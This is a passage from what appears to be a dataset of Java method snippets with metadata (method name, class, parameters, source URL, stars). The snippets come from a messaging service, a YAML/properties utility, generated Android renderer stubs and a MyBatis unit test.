clazz.getSuperclass();\n                String clazzName = clazz.getName();\n                /** Skip system classes, this just degrades performance. */\n                if (clazzName.startsWith(\"java.\") || clazzName.startsWith(\"javax.\") || clazzName.startsWith(\"android.\")) {\n                    clazz = null;\n                }\n            }\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 32474, "method_name": "save", "class_name": "MessageService", "params": ["MessageDTO"], "throws": null, "modifiers": ["public"], "return_type": "MessageDTO", "snippet": "    public MessageDTO save(MessageDTO messageDTO) {\n        log.debug(\"Request to save Message : {}\", messageDTO);\n        securityHelperService.checkPermission(messageDTO.getUserFrom().getId());\n        Message message = messageMapper.toEntity(messageDTO);\n        message.setType(MessageType.USER); //So far, only user messages are supported\n        setThreadBetweenTwoUsers(message);\n        message.setOpened(false);\n        message = messageRepository.save(message);\n        return messageMapper.toDto(message);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MessageService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32475, "method_name": "delete", "class_name": "MessageService", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void delete(Long id) {\n        log.debug(\"Request to delete Message : {}\", id);\n        messageRepository.deleteById(id);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MessageService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32476, "method_name": "getLatestThreadMessagesForLoggedInUser", "class_name": "MessageService", "params": ["Pageable"], "throws": null, "modifiers": ["public"], "return_type": "Page<MessageDTO>", "snippet": "    public Page<MessageDTO> getLatestThreadMessagesForLoggedInUser(Pageable pageable) {\n        log.debug(\"Request to get latest message in each thread for logged in user\");\n        Iterator<Sort.Order> argIterator = pageable.getSort().iterator();\n        List<Sort.Order> orderList = new LinkedList<>();\n        while (argIterator.hasNext()) {\n            Sort.Order currentOrder = argIterator.next();\n            String camelCaseProperty = CaseFormat.UPPER_CAMEL.to(CaseFormat.LOWER_UNDERSCORE, currentOrder.getProperty());\n            Sort.Order snakeCaseOrder = new Sort.Order(currentOrder.getDirection(), camelCaseProperty);\n            orderList.add(snakeCaseOrder);\n        }\n        Sort snakeCaseSort = Sort.by(orderList);\n        return messageRepository.getLatestThreadMessagesForUser(securityHelperService.getLoggedInUser(), PageRequest.of(pageable.getPageNumber(), pageable.getPageSize(), snakeCaseSort)).map(messageMapper::toDto);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MessageService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32477, "method_name": "getUnreadNotificationsForLoggedInUser", "class_name": "MessageService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<MessageDTO>", "snippet": "    public List<MessageDTO> getUnreadNotificationsForLoggedInUser() {\n        log.debug(\"Request to get latest unread messages for logged in user per thread\");\n        return messageRepository.getUnreadNotificationsForUser(securityHelperService.getLoggedInUser()).stream()\n            .map(messageMapper::toDto).collect(Collectors.toList());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MessageService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32478, "method_name": "updateThreadToOpenedForUser", "class_name": "MessageService", "params": ["UUID"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateThreadToOpenedForUser(UUID thread) {\n        log.debug(\"Request to open messages in thread: {}\", thread);\n        if (messageRepository.canUserAccessThread(securityHelperService.getLoggedInUser(), thread)) {\n            messageRepository.updateThreadToOpenedForUser(securityHelperService.getLoggedInUser(), thread);\n        } else {\n            throw new MissingAuthorityForMessageThreadServiceException();\n        }\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MessageService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32479, "method_name": "updateAllSystemNotificationsToOpenedForLoggedInUser", "class_name": "MessageService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateAllSystemNotificationsToOpenedForLoggedInUser() {\n        log.debug(\"Request to open all system messages for logged-in user\");\n        messageRepository.updateSystemMessagesToOpenedForUser(securityHelperService.getLoggedInUser());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MessageService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32480, "method_name": "findByThread", "class_name": "MessageService", "params": ["UUID", "Pageable"], "throws": null, "modifiers": ["public"], "return_type": "Page<MessageDTO>", "snippet": "    public Page<MessageDTO> findByThread(UUID thread, Pageable pageable) {\n        log.debug(\"Request to find all messages in thread : {}\", thread);\n        if (messageRepository.canUserAccessThread(securityHelperService.getLoggedInUser(), thread)) {\n            return messageRepository.getByThread(thread, pageable).map(messageMapper::toDto);\n        } else {\n            throw new MissingAuthorityForMessageThreadServiceException();\n        }\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MessageService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32481, "method_name": "createLeasingNotification", "class_name": "MessageService", "params": ["Leasing"], "throws": null, "modifiers": ["public"], "return_type": "MessageDTO", "snippet": "    public MessageDTO createLeasingNotification(Leasing leasing) {\n        log.debug(\"Request to create SYSTEM_LEASING_OPEN notification for leasing: {}\", leasing.getId());\n        Message notification = new Message();\n        User userFrom = null;\n        User userTo = null;\n        MessageType msgType = null;\n        switch (leasing.getStatus()){\n            case OPEN:\n                userFrom = leasing.getUser();\n                userTo = leasing.getGardenField().getOwner();\n                msgType = MessageType.SYSTEM_LEASING_OPEN;\n                break;\n            case CANCELLED:\n                userFrom = leasing.getUser();\n                userTo = leasing.getGardenField().getOwner();\n                msgType = MessageType.SYSTEM_LEASING_CANCELLED;\n                break;\n            case RESERVED:\n                userFrom = leasing.getGardenField().getOwner();\n                userTo = leasing.getUser();\n                msgType = MessageType.SYSTEM_LEASING_RESERVED;\n                break;\n            case REJECTED:\n                userFrom = leasing.getGardenField().getOwner();\n                userTo = leasing.getUser();\n                msgType = MessageType.SYSTEM_LEASING_REJECTED;\n                break;\n            default:\n                break;\n        }\n        notification.setLeasing(leasing);\n        notification.setUserFrom(userFrom);\n        notification.setUserTo(userTo);\n        setThreadBetweenTwoUsers(notification);\n        notification.setOpened(false);\n        notification.setType(msgType);\n        notification = messageRepository.save(notification);\n        return messageMapper.toDto(notification);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MessageService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32482, "method_name": "setThreadBetweenTwoUsers", "class_name": "MessageService", "params": ["Message"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setThreadBetweenTwoUsers(Message message) {\n        UUID existingThread = messageRepository.threadBetweenTwoUsers(message.getUserFrom(), message.getUserTo());\n        message.setThread(existingThread == null ? UUID.randomUUID() : existingThread);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MessageService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32483, "method_name": "getId", "class_name": "ItemStockDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemStockDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32484, "method_name": "setId", "class_name": "ItemStockDO", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemStockDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32485, "method_name": "getStock", "class_name": "ItemStockDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getStock() {\n        return stock;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemStockDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32486, "method_name": "setStock", "class_name": "ItemStockDO", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStock(Integer stock) {\n        this.stock = stock;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemStockDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32487, "method_name": "getItemId", "class_name": "ItemStockDO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getItemId() {\n        return itemId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemStockDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32488, "method_name": "setItemId", "class_name": "ItemStockDO", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItemId(Integer itemId) {\n        this.itemId = itemId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemStockDO.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32489, "method_name": "toProperties", "class_name": "PropertyUtils", "params": ["TreeMap<String,Map>"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String toProperties(TreeMap<String, Map<String, Object>> config) {\n    StringBuilder sb = new StringBuilder();\n    for (String key : config.keySet()) {\n      sb.append(toString(key, config.get(key)));\n    }\n    return sb.toString();\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/PropertyUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32490, "method_name": "confFieldMap", "class_name": "PropertyUtils", "params": [], "throws": ["IllegalAccessException"], "modifiers": ["public", "static"], "return_type": "Map<String,String>", "snippet": "  public static Map<String, String> confFieldMap() throws IllegalAccessException {\n    final Map<String, String> constArgsMap = new HashMap<>();\n    List<Field> fields = Arrays.asList(Const.class.getFields());\n    for (Field field : new ArrayList<>(fields)) {\n      if (field.getName().contains(Const.PATH_PREFIX_ROOT)) {\n        continue;\n      }\n      constArgsMap.put(field.getName(), String.valueOf(field.get(field.getName())));\n    }\n    return constArgsMap;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/PropertyUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32491, "method_name": "toString", "class_name": "PropertyUtils", "params": ["String", "Map<String,Object>"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String toString(String key, Map<String, Object> map) {\n    StringBuilder sb = new StringBuilder();\n    for (String mapKey : map.keySet()) {\n      if (map.get(mapKey) instanceof Map) {\n        sb.append(toString(String.format(\"%s.%s\", key, mapKey), (Map<String, Object>) map.get(mapKey)));\n      } else {\n        sb.append(String.format(\"%s.%s=%s%n\", key, mapKey, map.get(mapKey).toString()));\n      }\n    }\n    return sb.toString();\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/PropertyUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32492, "method_name": "parseArgs", "class_name": "PropertyUtils", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Map<String,String>", "snippet": "  public static Map<String, String> parseArgs(String[] args) {\n    Map<String, String> argsMap = new HashMap<>();\n    if (args == null || args.length == 0) {\n      return argsMap;\n    }\n\n    for (String arg : args) {\n      if (arg.startsWith(\"--\") && arg.contains(\"=\")) {\n        String[] param = arg.substring(2).split(\"=\");\n        argsMap.put(param[0], param[1]);\n      }\n    }\n    return argsMap;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/PropertyUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32493, "method_name": "yaml", "class_name": "PropertyUtils", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "TreeMap<String,Map>", "snippet": "  public static TreeMap<String, Map<String, Object>> yaml(String location) {\n    if (!location.startsWith(\"/\")) {\n      location = \"/\" + location;\n    }\n    InputStream resourceAsStream = PropertyUtils.class.getResourceAsStream(location);\n    if (resourceAsStream == null) {\n      return null;\n    }\n    return yaml().loadAs(resourceAsStream, TreeMap.class);\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/PropertyUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32494, "method_name": "yaml", "class_name": "PropertyUtils", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "Yaml", "snippet": "  private static Yaml yaml() {\n    return new Yaml();\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/PropertyUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32495, "method_name": "getCurrentClassPath", "class_name": "PropertyUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String getCurrentClassPath() {\n    URL url = PropertyUtils.class.getResource(\"/\");\n    String path;\n    if (null == url) {\n      File f = new File(PropertyUtils.class.getProtectionDomain().getCodeSource().getLocation().getPath());\n      path = f.getPath();\n    } else {\n      path = url.getPath();\n    }\n    try {\n      if (isWindows()) {\n        return decode(path.replaceFirst(\"^/(.:/)\", \"$1\"));\n      }\n      return decode(path);\n    } catch (UnsupportedEncodingException e) {\n      return \"/\";\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/PropertyUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32496, "method_name": "decode", "class_name": "PropertyUtils", "params": ["String"], "throws": ["UnsupportedEncodingException"], "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String decode(String path) throws UnsupportedEncodingException {\n    return java.net.URLDecoder.decode(path, StandardCharsets.UTF_8);\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/PropertyUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32497, "method_name": "onAttachedToWindow", "class_name": "TabbedPageRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onAttachedToWindow ()\n\t{\n\t\tn_onAttachedToWindow ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32498, "method_name": "n_onAttachedToWindow", "class_name": "TabbedPageRenderer", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onAttachedToWindow ();\n\n\n\tpublic void onDetachedFromWindow ()\n\t{\n\t\tn_onDetachedFromWindow ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32499, "method_name": "onDetachedFromWindow", "class_name": "TabbedPageRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onDetachedFromWindow ()\n\t{\n\t\tn_onDetachedFromWindow ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32500, "method_name": "n_onDetachedFromWindow", "class_name": "TabbedPageRenderer", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onDetachedFromWindow ();\n\n\n\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\n\t{\n\t\tn_onLayout (p0, p1, p2, p3, p4);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32501, "method_name": "onLayout", "class_name": "TabbedPageRenderer", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\n\t{\n\t\tn_onLayout (p0, p1, p2, p3, p4);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32502, "method_name": "n_onLayout", "class_name": "TabbedPageRenderer", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onLayout (boolean p0, int p1, int p2, int p3, int p4);\n\n\n\tpublic void onTabReselected (android.support.design.widget.TabLayout.Tab p0)\n\t{\n\t\tn_onTabReselected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32503, "method_name": "onTabReselected", "class_name": "TabbedPageRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTabReselected (android.support.design.widget.TabLayout.Tab p0)\n\t{\n\t\tn_onTabReselected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32504, "method_name": "n_onTabReselected", "class_name": "TabbedPageRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTabReselected (android.support.design.widget.TabLayout.Tab p0);\n\n\n\tpublic void onTabSelected (android.support.design.widget.TabLayout.Tab p0)\n\t{\n\t\tn_onTabSelected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32505, "method_name": "onTabSelected", "class_name": "TabbedPageRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTabSelected (android.support.design.widget.TabLayout.Tab p0)\n\t{\n\t\tn_onTabSelected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32506, "method_name": "n_onTabSelected", "class_name": "TabbedPageRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTabSelected (android.support.design.widget.TabLayout.Tab p0);\n\n\n\tpublic void onTabUnselected (android.support.design.widget.TabLayout.Tab p0)\n\t{\n\t\tn_onTabUnselected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32507, "method_name": "onTabUnselected", "class_name": "TabbedPageRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTabUnselected (android.support.design.widget.TabLayout.Tab p0)\n\t{\n\t\tn_onTabUnselected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32508, "method_name": "n_onTabUnselected", "class_name": "TabbedPageRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTabUnselected (android.support.design.widget.TabLayout.Tab p0);\n\n\n\tpublic void onPageScrollStateChanged (int p0)\n\t{\n\t\tn_onPageScrollStateChanged (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32509, "method_name": "onPageScrollStateChanged", "class_name": "TabbedPageRenderer", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPageScrollStateChanged (int p0)\n\t{\n\t\tn_onPageScrollStateChanged (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32510, "method_name": "n_onPageScrollStateChanged", "class_name": "TabbedPageRenderer", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPageScrollStateChanged (int p0);\n\n\n\tpublic void onPageScrolled (int p0, float p1, int p2)\n\t{\n\t\tn_onPageScrolled (p0, p1, p2);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32511, "method_name": "onPageScrolled", "class_name": "TabbedPageRenderer", "params": ["int", "float", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPageScrolled (int p0, float p1, int p2)\n\t{\n\t\tn_onPageScrolled (p0, p1, p2);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32512, "method_name": "n_onPageScrolled", "class_name": "TabbedPageRenderer", "params": ["int", "float", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPageScrolled (int p0, float p1, int p2);\n\n\n\tpublic void onPageSelected (int p0)\n\t{\n\t\tn_onPageSelected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32513, "method_name": "onPageSelected", "class_name": "TabbedPageRenderer", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPageSelected (int p0)\n\t{\n\t\tn_onPageSelected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32514, "method_name": "n_onPageSelected", "class_name": "TabbedPageRenderer", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPageSelected (int p0);\n\n\n\tpublic boolean onNavigationItemSelected (android.view.MenuItem p0)\n\t{\n\t\treturn n_onNavigationItemSelected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32515, "method_name": "onNavigationItemSelected", "class_name": "TabbedPageRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onNavigationItemSelected (android.view.MenuItem p0)\n\t{\n\t\treturn n_onNavigationItemSelected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32516, "method_name": "n_onNavigationItemSelected", "class_name": "TabbedPageRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onNavigationItemSelected (android.view.MenuItem p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32517, "method_name": "monodroidAddReference", "class_name": "TabbedPageRenderer", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32518, "method_name": "monodroidClearReferences", "class_name": "TabbedPageRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/TabbedPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32519, "method_name": "testHasAdditionalParameter", "class_name": "BoundSqlTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testHasAdditionalParameter() {\n    List<ParameterMapping> params = Collections.emptyList();\n    BoundSql boundSql = new BoundSql(new Configuration(), \"some sql\", params, new Object());\n\n    Map<String, String> map = new HashMap<>();\n    map.put(\"key1\", \"value1\");\n    boundSql.setAdditionalParameter(\"map\", map);\n\n    Person bean = new Person();\n    bean.id = 1;\n    boundSql.setAdditionalParameter(\"person\", bean);\n\n    String[] array = new String[] {\"User1\", \"User2\"};\n    boundSql.setAdditionalParameter(\"array\", array);\n\n    assertFalse(boundSql.hasAdditionalParameter(\"pet\"));\n    assertFalse(boundSql.hasAdditionalParameter(\"pet.name\"));\n\n    assertTrue(boundSql.hasAdditionalParameter(\"map\"));\n    assertTrue(boundSql.hasAdditionalParameter(\"map.key1\"));\n    assertTrue(boundSql.hasAdditionalParameter(\"map.key2\"), \"should return true even if the child property does not exists.\");\n\n    assertTrue(boundSql.hasAdditionalParameter(\"person\"));\n    assertTrue(boundSql.hasAdditionalParameter(\"person.id\"));\n    